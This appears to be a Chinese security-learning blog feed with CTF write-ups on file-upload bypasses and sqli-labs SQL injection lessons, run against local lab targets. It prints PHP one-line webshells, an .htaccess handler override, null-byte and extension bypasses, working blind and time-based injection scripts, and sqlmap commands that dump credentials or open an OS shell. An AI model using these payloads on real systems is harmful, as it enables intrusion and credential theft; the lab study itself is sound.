<p><code>绕过方法</code>:制作图马，简单图马是直接把一句话木马放在图片末尾以绕过文件头检查</p>
<pre><code class="language-php">//命令行合成图马
copy 1.png/b+1.txt/a 2.png
//b,a表示合成时各文件的编码方式，b为二进制，a为ascll
</code></pre>
<p><code>二次渲染</code>：同样也是检测文件是否是真的png或gif，上传之后的图片会被二次渲染，使得图马中的一句话木马变成乱码无法执行</p>
<p><code>绕过方法</code>：下载被二次渲染后的图马与原来的图马比较，找到相同的地方，插入一句话木马。</p>
<p>（png、jpg、jpeg都不好改，gif好改）</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211018165017388.png" alt="image-20211018165017388" style="zoom: 50%;" />
<p>上传图马，配合解析漏洞、文件包含漏洞等使图马以php格式执行即可。</p>
<h3 id="6解析漏洞">6.解析漏洞</h3>
<h4 id="00截断攻击">00截断攻击</h4>
<p><code>漏洞原理</code>：系统端解析文件格式和服务端解析文件格式的顺序不同，系统端由后往前解析，服务端反之。抓包将 xxx.php.gif 换成 xxx.php_gif(下划线为0x00)。在上传文件时系统文件遇到0x00。会认为文件已经结束。从而将xxx.php.gif的内容写入到xxx.php。（需要允许修改保存路径）</p>
<p><code>绕过方法</code>：</p>
<p>GET方式上传：抓包，在保存路径后面添加1.php%00（%00会自动解码），文件名不变仍为1.gif</p>
<p>POST方式上传：抓包，在保存路径后面添加1.php+在HEX界面找到这个加号修改为00，文件名仍不变为1.gif</p>
<h4 id="黑名单绕过">黑名单绕过</h4>
<p><code>绕过方法</code>：</p>
<p>1、文件名大小写绕过（AsP, pHp等等）<br>
2、黑白名单列表绕过（php、php2、php3、php5、phtml、asp、aspx、ascx、ashx、cer、asa、jsp、jspx）cdx，<br>
3、特殊文件名绕过：修改数据包里的文件名改为 test.php. 或者 test.asp_ (下划线是空格)由于这种命名格式在windows系统里是不允许的。所以在绕过上传之后windows系统会自动去掉 点和空格。Unix/Linux系统没有这个特性。<br>
4、0x00截断绕过<br>
5、.htaccess文件攻击（结合黑名单攻击）</p>
<h4 id="apache解析漏洞">Apache解析漏洞</h4>
<p><code>漏洞原理</code>：一个文件名为test.php.aaa.bbb.ccc的文件，Apache会从ccc的位置往php的位置开始尝试解析 ，如果ccc不属于Apache能解析的后缀名，那么Apache就会尝试去解析bbb，这样一直往前尝试，直到遇到一个能解析的拓展名为止</p>
<p><code>绕过方法</code>:添加无用扩展名如xxx.php --&gt;xxx.php.aaa</p>
<h4 id="iis解析漏洞">IIS解析漏洞</h4>
<p><code>IIS6.0解析漏洞</code>：</p>
<p>1.目录解析：以.asp 、.asa、.cer、.cdx命名的文件夹里的文件都将会被当成ASP文件执行。</p>
<p>2.文件解析：只要文件名中含有.asp;、.asa;、.cer;、.cdx;会优先按 asp来解析，.asp;.jpg 这种畸形文件名在“；”后面的直接被忽略，也就是说当成 *.asp文件执行。</p>
<p><code>IIS7.0/7.5解析漏洞</code>:</p>
<p>对任意文件名只要在URL后面追加上字符串&quot;/任意文件名.php&quot;,就会按照 php 的方式去解析<br>
如”http://url/upload/1.jpg/1adf.php”</p>
<h2 id="练习题目">练习题目</h2>
<h3 id="极客大挑战-2019upload1">[极客大挑战 2019]Upload1</h3>
<p><code>MIME绕过</code>和<code>黑名单绕过</code>，只允许上传图片，对php有简单过滤。</p>
<p>上传一句话木马</p>
<pre><code class="language-php">&lt;?php @eval($_POST['pass']);?&gt;
</code></pre>
<p>抓包修改</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019164716089.png" alt="image-20211019164716089" style="zoom:150%;" />
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019164731251.png" alt="image-20211019164731251" style="zoom: 33%;" />
<p>对内容有过滤，换一个木马</p>
<pre><code class="language-php">GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[pass])&lt;/script&gt;
</code></pre>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019165114142.png" alt="image-20211019165114142" style="zoom:150%;" />
<p>成功</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019165418509.png" alt="image-20211019165418509" style="zoom: 33%;" />
<p>访问该文件upload/2.phtml</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019165551551.png" alt="image-20211019165551551" style="zoom:50%;" />
<p>说明存在该文件，蚁剑连接</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019170411685.png" alt="image-20211019170411685" style="zoom:67%;" />
<p>找到flag</p>
<h3 id="actf2020-新生赛upload1">[ACTF2020 新生赛]Upload1</h3>
<p><code>前端过滤</code></p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019170918935.png" alt="image-20211019170918935" style="zoom: 67%;" />
<p>把文件改成gif，抓包再改成php</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019171957129.png" alt="image-20211019171957129" style="zoom: 80%;" />
<p>修改<br>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019172023103.png" alt="image-20211019172023103" style="zoom:150%;" /></p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019172352138.png" alt="image-20211019172352138" style="zoom:67%;" />
<p>emmmphp也要绕一下改成phtml</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019172444434.png" alt="image-20211019172444434" style="zoom:150%;" />
<p>有了，访问该页面</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019172549473.png" alt="image-20211019172549473" style="zoom:80%;" />
<p>蚁剑一下，用命令行找到flag</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019173439257.png" alt="image-20211019173439257" style="zoom:67%;" />
<h3 id="mrctf2020你传你呢1">[MRCTF2020]你传你🐎呢1</h3>
<p><code>htaccess绕过</code></p>
<pre><code class="language-php">//把hack.png解析成php
&lt;FilesMatch &quot;hack.png&quot;&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
</code></pre>
<p>上传htaccess文件，抓包修改类型为png</p>
<p><img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019180047323.png"
alt="image-20211019180047323" style="zoom: 100%;" /></p>
<p>再上传一个含有木马的假png，上传成功</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019175206673.png" alt="image-20211019175206673" style="zoom: 50%;" />
<p>蚁剑一下，找到flag</p>
<h3 id="第二章-web进阶文件上传1">[第二章 web进阶]文件上传1</h3>
<p>题目直接给出了源码，得到过滤信息：</p>
<p>1.仅允许上传zip、jpg、gif、png文件<br>
2.如果上传压缩包，压缩包内不允许含有php文件</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019183807280.png" alt="image-20211019183807280" style="zoom:67%;" />
<p>上传一个含有php的zip</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019183103048.png" alt="image-20211019183103048" style="zoom:50%;" />
<p>要绕过php，改成phtml，上传成功，问题是不知道路径</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019183524005.png" alt="image-20211019183524005" style="zoom:67%;" />
<p>上传成功后会在upload下随机生成一个md5目录存放文件，也就是说很难拿到文件的路径，设法绕过这个目录，让文件存储在根目录下</p>
<p>010 editor修改文件名，使之存在根目录下（修改的时候现在原来的文件名预留足够的位置）</p>
<p><img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019191350117.png"
alt="image-20211019191350117" style="zoom:100%;" /></p>
<p>emmmm，御剑连上了但打不开，文件名换成php.xx(<code>Apache解析漏洞</code>)</p>
<p>上传后访问，得到flag</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019192014051.png" alt="image-20211019192014051" style="zoom:67%;" />]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[sqli-labs(11~20)脚本、sqlmap学习]]></title>
        <id>https://z0ekball.github.io/post/sqli-labs11~20jiao-ben-sqlmap-xue-xi/</id>
        <link href="https://z0ekball.github.io/post/sqli-labs11~20jiao-ben-sqlmap-xue-xi/">
        </link>
        <updated>2021-06-18T14:56:25.000Z</updated>
        <content type="html"><![CDATA[<h1 id="sqlmap知识补充">sqlmap知识补充</h1>
<pre><code>-r 表示加载一个文件
-p 指定参数
</code></pre>
<h1 id="less-11普普通通的post">less-11(普普通通的post)</h1>
<h3 id="上传post文件得到参数">上传post文件，得到参数</h3>
<pre><code>sqlmap.py -r &quot;C:\Users\丷木丷\Desktop\less-11.txt&quot;
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/1624290761761.png" alt="" loading="lazy"></figure>
<h3 id="根据参数得到当前数据库">根据参数，得到当前数据库</h3>
<pre><code>sqlmap.py -r &quot;C:\Users\丷木丷\Desktop\less-11.txt&quot; -p uname --dbs
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/1624290826466.png" alt="" loading="lazy"></figure>
<h3 id="获取用户名和密码">获取用户名和密码</h3>
<pre><code>sqlmap.py -r &quot;C:\Users\丷木丷\Desktop\less-11.txt&quot; -p uname -T &quot;users&quot;  -C &quot;username&quot;,&quot;password&quot; --dump
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/1624291100650.png" alt="" loading="lazy"></figure>
<h3 id="脚本查询当前数据库名称采用盲注形式">脚本：查询当前数据库名称(采用盲注形式)</h3>
<pre><code class="language-python">import requests #比urllib.parse方便
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-11/&quot;
d = list('abcdefghijklmnopqrstuvwxyz0123456789@_.{}?!')
#注入字段
inn=&quot;1' or 1=1 and mid((database()),%s,1)='%s'#&quot;
for i in range(1,30):
    for j in d:
        #字典格式
        data={'uname':inn %(i,j),'passwd':'','submit':'Submit'}
        #发送post请求
        response = requests.post(url,data = data)
        #获取报文
        t=response.text
        if t.find('Login') &gt;0:
            name+=j
            print(j)
print(name)
</code></pre>
<h3 id="结果">结果</h3>
<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/1624294940779.png" alt="" loading="lazy"></figure>
<h1 id="less-12">less-12</h1>
<p>uname=n&quot;) or 1=1 #,其他和11一样</p>
<h1 id="less-13时间盲注">less-13(时间盲注)</h1>
<h3 id="获取id和用户名">获取id和用户名</h3>
<pre><code>sqlmap.py -r &quot;C:\Users\丷木丷\Desktop\less-13.txt&quot; -D &quot;security&quot; -T &quot;users&quot; -C &quot;id&quot;,&quot;username&quot; --dump
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/1624298061718.png" alt="" loading="lazy"></figure>
<h3 id="脚本获取id3的用户名参考时间盲注">脚本：获取id=3的用户名，参考时间盲注</h3>
<pre><code class="language-python">import requests
import time
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-13/&quot;
d = list('abcdefghijklmnopqrstuvwxyz')
#注入字段
inn=&quot;n') or if(mid((select username from security.users where id=3),%s,1)='%s',sleep(1),0)#&quot;
for i in range(1,10):
    for j in d:
        #字典格式
        time1=time.time()
        data={'uname':inn %(i,j),'passwd':'','submit':'Submit'}
        #print(data)
        #发送post请求
        response = requests.post(url,data = data)
        #t=response.text
        #获取报文
        time2=time.time()
        if time2-time1 &gt;1:
            name+=j
            print(j)
            
print(name)
</code></pre>
<h3 id="结果-2">结果</h3>
<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/1624298188766.png" alt="" loading="lazy"></figure>
<h1 id="less-14">less-14</h1>
<p>和13一样的时间盲注，但注意转义成 \&quot;</p>
<h3 id="脚本获取库">脚本：获取库</h3>
<pre><code class="language-python">import requests
import time
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-14/&quot;
d = list('abcdefghijklmnopqrstuvwxyz')
#注入字段
#这里的引号有冲突，改为\&quot;
inn=&quot;n\&quot; or if(mid((database()),%s,1)='%s',sleep(1),0)#&quot;
for i in range(1,10):
    for j in d:
        #字典格式
        time1=time.time()
        data={'uname':inn %(i,j),'passwd':'','submit':'Submit'}
        #print(data)
        #发送post请求
        response = requests.post(url,data = data)
        #t=response.text
        #获取报文
        time2=time.time()
        if time2-time1 &gt;1:
            name+=j
            print(j)
            
print(name)
</code></pre>
<h3 id="结果-3">结果</h3>
<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/1624299560173.png" alt="" loading="lazy"></figure>
<h1 id="less-15密码注入点">less-15(密码注入点)</h1>
<p>和前面一样，注入点改为密码</p>
<h3 id="脚本获取库-2">脚本：获取库</h3>
<pre><code class="language-python">import requests
import time
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-15/&quot;
d = list('abcdefghijklmnopqrstuvwxyz')
#注入字段
inn=&quot;n' or if(mid((database()),%s,1)='%s',sleep(1),0)#&quot;
for i in range(1,10):
    for j in d:
        #字典格式
        time1=time.time()
        #注入点在密码
        data={'uname':'','passwd':inn %(i,j),'submit':'Submit'}
        #print(data)
        #发送post请求
        response = requests.post(url,data = data)
        #t=response.text
        #获取报文
        time2=time.time()
        if time2-time1 &gt;1:
            name+=j
            print(j)
            
print(name)
</code></pre>
<h3 id="结果-4">结果</h3>
<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/1624300007923.png" alt="" loading="lazy"></figure>
<h1 id="less-16">less-16</h1>
<p>uname=addmin&amp;passwd=ad&quot; or 1=1 #，注意\&quot;，其他和15一样</p>
<h1 id="less-17updatexml报错注入">less-17(updatexml报错注入)</h1>
<p>注意\'转义</p>
<h3 id="脚本查询数据库">脚本：查询数据库</h3>
<pre><code class="language-python">import requests
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-17/&quot;
d = list('abcdefghijklmnopqrstuvwxyz')
data={'uname':'admin','passwd':'dadad\' and updatexml(1,concat(0x7e,(database())),1)#','submit':'Submit'}
r = requests.post(url,data = data)
t=r.text
print(t)
</code></pre>
<h3 id="结果在报错信息中可见库">结果：在报错信息中可见库</h3>
<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/1624304453223.png" alt="" loading="lazy"></figure>
<h1 id="less-18user-agent注入">less-18(user-agent注入)</h1>
<h3 id="脚本post请求修改请求头的user-agent-bibi赖赖转义改的心态崩了">脚本：post请求修改请求头的user-agent    (bibi赖赖：转义改的心态崩了= =)</h3>
<pre><code class="language-python">import requests
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-18/&quot;
#\转义  \转义  \转义  \转义  \转义  \转义 \转义 
'''
{'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0)Gecko/20100101 Firefox/89.0
 \'or updatexml(1,concat(0x7e,(database())),1)or \'1\'=\'1'}
'''
u={'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\'or updatexml(1,concat(0x7e,(database())),1)or \'1\'=\'1'}
data={'uname':'admin','passwd':'admin','submit':'Submit'}
r = requests.post(url,data,headers=u)
t=r.text
print(t)
</code></pre>
<h3 id="结果-5">结果</h3>
<figure data-type="image" tabindex="10"><img src="https://z0ekball.github.io/post-images/1624307139151.png" alt="" loading="lazy"></figure>
<h1 id="less-19referer注入">less-19(referer注入)</h1>
<h3 id="脚本跟18一样改成referer就行同样需要转义">脚本：跟18一样，改成referer就行，同样需要转义</h3>
<pre><code class="language-python">import requests
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-19/&quot;
'''
Referer: http://127.0.0.1/sqli/Less-19/
{'Referer':'http://127.0.0.1/sqli/Less-19/
 \'or updatexml(1,concat(0x7e,(database())),1)or \'1\'=\'1'}
'''
u={'Referer':'http://127.0.0.1/sqli/Less-19/\'or updatexml(1,concat(0x7e,(database())),1)or \'1\'=\'1'}
data={'uname':'admin','passwd':'admin','submit':'Submit'}
r = requests.post(url,data,headers=u)
t=r.text
print(t)
</code></pre>
<h3 id="结果-6">结果</h3>
<figure data-type="image" tabindex="11"><img src="https://z0ekball.github.io/post-images/1624307491060.png" alt="" loading="lazy"></figure>
<h1 id="less-20cookie注入">less-20(cookie注入)</h1>
<p>cookie中value值' #注入</p>
<h3 id="脚本">脚本</h3>
<pre><code class="language-python">import requests
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-20/&quot;
u={'Cookie':'uname=1\' union select 1,2,group_concat(concat_ws(\'-\',id,username,password)) from users#'}
data={'uname':'admin','passwd':'admin','submit':'Submit'}
r = requests.post(url,data,headers=u)
t=r.text
print(t)
</code></pre>
<h3 id="结果整不出来应该是版本问题暂时未解决">结果：整不出来，应该是版本问题，暂时未解决</h3>
<figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/1624308452186.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[sqli-labs(1~10)脚本、sqlmap学习]]></title>
        <id>https://z0ekball.github.io/post/sqli-jiao-ben/</id>
        <link href="https://z0ekball.github.io/post/sqli-jiao-ben/">
        </link>
        <updated>2021-06-15T07:11:55.000Z</updated>
        <content type="html"><![CDATA[<h2 id="一些准备">一些准备</h2>
<ol>
<li>安装sqlmap</li>
<li>命令行pip install requests 检查时候安装request或者需要更新，否则无法使用；</li>
<li>加引号快捷键用不，用正则表达式进行替换</li>
</ol>
<pre><code>(.*?):(.*)
'$1':'$2'，
</code></pre>
<h1 id="sqlmap基础知识">sqlmap基础知识</h1>
<ol>
<li>sqlmap常见步骤：</li>
</ol>
<pre><code>sqlmap -u url --dbs #获取数据库
sqlmap -u url --current-user #获取当前用户名称 ：
sqlmap -u url --current-db #获取当前数据库名称
sqlmap -u url -D 数据库名 --tables   #列出表名 ： 
sqlmap -u url -D 数据库名 -T 表名 --columns #列出字段 
sqlmap -u url -D 数据库名 -T 表名 -C 字段名1,字段名2,…… --dump #获取字段内容
</code></pre>
<ol start="2">
<li>常见参数</li>
</ol>
<pre><code>--cookie=cookie的内容        设置cookie 值 通常配合获取数据库使用 
--data        设置 POST 提交的值
-u        指定目标 URL
-b        获取 DBMS banner
--current-db        获取当前数据库
--current-user        获取当前数据库的用户
--tables        获取数据库里所有的表名
--columns        获取表里的所有字段
--dump        获取字段中的内容
--current-user        获取当前用户
-D [数据库名]       指定数据库名
-T  [表名]      指定表名
-C  [字段名]      指定字段名
--string       当查询可用时用来匹配页面中的字符串
--users        枚举所有用户
--passwords      枚举所有用户的密码hsah
--dbs      枚举数据库中的数据库名
-r       指定请求包

GET型注入一般用 sqlmap -u url
POST型注入一般用 sqlmap -u url --data POST参数
</code></pre>
<ol start="3">
<li>常见命令</li>
</ol>
<pre><code>--sql-query=&quot; &quot;  执行查询语句
--level 5  探测等级(1~5 默认为1，等级越高Payload越多，速度也比较慢)
--is-dba   判断当前用户是否是管理员权限
--roles    列出数据库管理员角色(仅适用与Oracle数据库)
--referer  HTTP Referer头(伪造HTTP头中的Referer，当--level等级大于等于3时会通过伪造Referer来进行注入)
--sql-shell 运行自定义SQL语句 用法：sqlmap -u url --sql-shell
--os-cmd，--os-shell 运行任意操作系统命令(仅支持MySQL、PostgreSQL、SQL Server)
--file-read 从数据库服务器中读取文件(要知道文件绝对路径)
--file-write &quot;本地文件路径&quot; --file-dest &quot;远程绝对路径&quot;   上传文件到数据库服务器中
</code></pre>
<h1 id="less-1普普通通的get">less-1(普普通通的get)</h1>
<h3 id="脚本获取用户和密码">脚本：获取用户和密码</h3>
<pre><code class="language-python">import urllib.parse #解析url
import http.client #实现了所有 HTTP 的方法（GET、POST、PUT、HEAD、DELETE、HEAD、OPTIONS 等）
                   #支持 HTTPS 协议
                   #支持代理服务器（Nginx等）等
                   #支持自动（跳转）转向

url = &quot;127.0.0.1&quot;
#body必须url编码,可用urllib.parse.quote()转,或者浏览器上转
body=&quot;/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(concat_ws(%27~%27,username,password))from%20security.users--+&quot;
c = http.client.HTTPConnection(url) #确定对象
c.request(&quot;GET&quot;, body) #确定方式 
r = c.getresponse()
print(r.status, r.reason) #状态字，状态原因
data = r.read()
print(data)
</code></pre>
<h3 id="结果">结果</h3>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/1624212566178.png" alt="" loading="lazy"></figure>
<h1 id="less-2">less-2</h1>
<p>id=-1--+，其他都一样</p>
<h1 id="less-3">less-3</h1>
<p>id=-1')--+,其他都一样</p>
<h1 id="less-4">less-4</h1>
<p>id=-1&quot;)--+,其他都一样</p>
<h1 id="less-5get盲注">less-5(get盲注)</h1>
<h3 id="知识点补充">知识点补充：</h3>
<pre><code>%s 在python中用法：
1. %10s代表输出宽度为10个字符，如果输出的字符串不超过10，则在左边补空格；宽度超过10，按原长度输出
2. %-10s表示如果输出的字符串宽度不超过10，则在右边补齐空格；宽度超过10，按原长度输出
3. %.10s表示截取前10个字符，若原长度不够10，则原样输出
4. %s 作为待定字符，在后%（i,j）可进行替换，达到爆破效果
</code></pre>
<h3 id="脚本爆破数据库名称">脚本：爆破数据库名称</h3>
<pre><code class="language-python">import urllib.parse
import http.client

#爆破字典
d = list('abcdefghijklmnopqrstuvwxyz')
name = ''
url = &quot;127.0.0.1&quot;

#不确定字数情况下，可以手注确认或者把爆破字数范围扩大
for i in range(1,20):
	for j in d:
		c = http.client.HTTPConnection(url)

        # 一个大坑：必须是url编码，除了%s外都是%%前缀，否则会报错
		body = &quot;/sqli/Less-5/?id=1%%27%%20and%%20mid(database(),%s,1)=%%27%s%%27--+&quot; % (i,j)
		print(body)
		c.request(&quot;GET&quot;, body) #确定方式
		r = c.getresponse() #提取响应包
		data = r.read()
		c.close()
		#确认正确的一项，拼接
		if data.find(b'You are in') &gt;0: 
			name += j
			print(j)
			break
		else:
			print(&quot;no&quot;)
print(name)
</code></pre>
<h3 id="结果-2">结果</h3>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/1624215382215.png" alt="" loading="lazy"></figure>
<h1 id="less-6sqlmap脚本">less-6（sqlmap+脚本）</h1>
<p>（emmmmm,不得不说第一次使用sqlmap,怀疑自己之前爆破个库名都死去活来，是不是傻= =）</p>
<h3 id="查看库名">查看库名</h3>
<pre><code>sqlmap.py  -u &quot;http://127.0.0.1/sqli/Less-6/?id=1/&quot; --dbs 
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/1624216731977.png" alt="" loading="lazy"></figure>
<h3 id="查看表名">查看表名</h3>
<pre><code>sqlmap.py  -u &quot;http://127.0.0.1/sqli/Less-6/?id=1/&quot; --tables
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/1624216883317.png" alt="" loading="lazy"></figure>
<h3 id="查看列名">查看列名</h3>
<pre><code>sqlmap.py  -u &quot;http://127.0.0.1/sqli/Less-6/?id=1/&quot; -D &quot;security&quot; -T &quot;users&quot; --columns
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/1624217172590.png" alt="" loading="lazy"></figure>
<h3 id="查看用户密码">查看用户密码</h3>
<pre><code>sqlmap.py  -u &quot;http://127.0.0.1/sqli/Less-6/?id=1/&quot; -D &quot;security&quot; -T &quot;users&quot; -C &quot;id&quot;,&quot;password&quot; --dump
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/1624218772000.png" alt="" loading="lazy"></figure>
<h3 id="脚本查询id2的用户密码">脚本：查询id=2的用户密码</h3>
<pre><code class="language-python"># 复制粘贴修改body
import urllib.parse
import http.client

#爆破字典
d = list('abcdefghijklmnopqrstuvwxyz123456789-_')
name = ''
url = &quot;127.0.0.1&quot;

#不确定字数情况下，可以手注确认或者把爆破字数范围扩大
for i in range(1,15):
	for j in d:
		c = http.client.HTTPConnection(url)
		body = &quot;/sqli/Less-6/?id=1%%22%%20and%%20mid((select%%20password%%20from%%20security.users%%20where%%20id=2),%s,1)=%%27%s%%27%%20--+&quot; % (i,j)
		print(body)
		c.request(&quot;GET&quot;, body) #确定方式
		r = c.getresponse() #提取响应包
		data = r.read()
		c.close()
		#确认正确的一项，拼接
		if data.find(b'You are in') &gt;0: 
			name += j
			print(j)
			break
		else:
			print(&quot;no&quot;)
print(name)
</code></pre>
<h3 id="结果-3">结果</h3>
<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/1624223954426.png" alt="" loading="lazy"></figure>
<h1 id="less-7">less-7</h1>
<p>id=1'))--+,布尔盲注，脚本基本一样<br>
练习一下sqlmap</p>
<h3 id="查询开头为a的用户和密码">查询开头为a的用户和密码</h3>
<pre><code>sqlmap.py  -u &quot;http://127.0.0.1/sqli/Less-7/?id=1/&quot; -D &quot;security&quot; -T &quot;users&quot; --sql-query=&quot;select username,password from users where username like 'a%'&quot;;
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/1624275315411.png" alt="" loading="lazy"></figure>
<h1 id="less-8">less-8</h1>
<p>id=1'--+,其他一样</p>
<h1 id="less-9时间盲注">less-9(时间盲注)</h1>
<h3 id="脚本id2的用户名要多运行一两次排除因为网速出现的延迟">脚本：id=2的用户名，要多运行一两次，排除因为网速出现的延迟</h3>
<pre><code class="language-python">import time
import urllib.parse
import http.client

#爆破字典
d = list('abcdefghijklmnopqrstuvwxyz')
name = ''
url = &quot;127.0.0.1&quot;

#不确定字数情况下，可以手注确认或者把爆破字数范围扩大
for i in range(1,15):
    for j in d:
        time1=time.time() #开始时间
        c=http.client.HTTPConnection(url)
        body=&quot;/sqli/Less-9/?id=1%%27%%20and%%20if(mid((select%%20username%%20from%%20security.users%%20where%%20id=2),%s,1)=%%27%s%%27,sleep(1),0)--+&quot;%(i,j)
        print(body)
        c.request(&quot;GET&quot;, body) #确定方式
        r = c.getresponse() #提取响应包
        time2=time.time() #结束时间
        data = r.read()
        c.close()
        #确认正确的一项，拼接
        if time2-time1 &gt;1:
            name += j
            print(j)
            break
		
print(name)
</code></pre>
<h3 id="结果-4">结果</h3>
<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/1624287255225.png" alt="" loading="lazy"></figure>
<h1 id="less-10">less-10</h1>
<p>id=1&quot;--+,其他和9一样</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[sqli-labs学习1~20]]></title>
        <id>https://z0ekball.github.io/post/sql-zhu-ru-ji-chu-zhi-shi/</id>
        <link href="https://z0ekball.github.io/post/sql-zhu-ru-ji-chu-zhi-shi/">
        </link>
        <updated>2021-06-05T12:22:39.000Z</updated>
        <content type="html"><![CDATA[<h5 id="注为方便学习加入两行代码">注：为方便学习,加入两行代码</h5>
<pre><code class="language-sql">echo $sql;
echo &quot;&lt;br&gt;&quot;;
</code></pre>
<h1 id="贯穿始终的步骤">贯穿始终的步骤：</h1>
<pre><code class="language-sql">mysql查询语句
查库：select schema_name from information_schema.schemata;
查表：select table_name from information_schema.tables where table_schema='security';
查列：select column_name from information_schema.columns where table_name='users';
查字段：select username,password from security.users;
</code></pre>
<h1 id="less-1">less-1</h1>
<p>注入漏洞：id=1'--+</p>
<h3 id="知识点补充">知识点补充：</h3>
<pre><code class="language-sql">* order by //判断多少个注入点
* union select  1,2,3  //查看那些数据可以回显(id=-1)
* group_concat() //批量查询
* concat_ws('~',a,b) //查询a~b
</code></pre>
<h3 id="查看当前数据库">查看当前数据库</h3>
<pre><code class="language-sql">id=-1' union select 1,2,database() --+
id=-1'  union select 1,2,concat_ws('~',user(),version(),database()) --+ 
//查询数据库版本,路径,当前用户,当前数据库
</code></pre>
<h3 id="查看数据库所有数据库">查看数据库/所有数据库</h3>
<pre><code class="language-sql">id=-1' union select 1,2,schema_name from information_schema.schemata limit 4,1--+  //limit 决定查看序数
id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+
</code></pre>
<h3 id="查看表所有表">查看表/所有表</h3>
<pre><code class="language-sql">id=-1' union select 1,2,table_name from information_schema.tables where table_schema=0x() limit 1,1--+
//十六进制绕过
id=-1' union select 1,2,group_concat(table_name) from information_schema. tables where table_schema=0x()--+
</code></pre>
<h3 id="查看列信息所有列信息">查看列信息/所有列信息</h3>
<pre><code class="language-sql">id=-1' union select 1,2,column_name from information_schema.columns where table_name=0x() --+

id=-1' union select 1,2,group_concat(column_name) from information_schema. columns where table_name=0x()--+
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/1623248765124.png" alt="" loading="lazy"></figure>
<h3 id="连接查询用户名和密码所有用户和密码">连接查询用户名和密码/所有用户和密码</h3>
<pre><code class="language-sql">id=-1'  union select 1,2,concat_ws('~',username,password)from security.users limit 1,1--+

id=-1' union select 1,2,group_concat(concat_ws('~',username,password))from security.users--+
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/1623248880427.png" alt="" loading="lazy"></figure>
<h1 id="less-2">less-2</h1>
<p>注入漏洞：id=1--+,不需要'</p>
<h1 id="less-3">less-3</h1>
<p>注入漏洞：id=1')--+</p>
<h1 id="less-4">less-4</h1>
<p>注入漏洞：id=1”)--+</p>
<h1 id="less-5布尔型盲注">less-5（布尔型盲注）</h1>
<p>注入漏洞：1'--+,布尔型盲注</p>
<h3 id="知识点补充-2">知识点补充</h3>
<pre><code class="language-sql">1. left(a,b) 从左侧截取a的前b位,正确返回1,错则返回0 ——burpsuit爆破
2. regexp 正则表达式
/转意
^匹配开始部分
$匹配结束部分
.匹配任何字符
[:character_class:]术语类的所有字符匹配的字符类
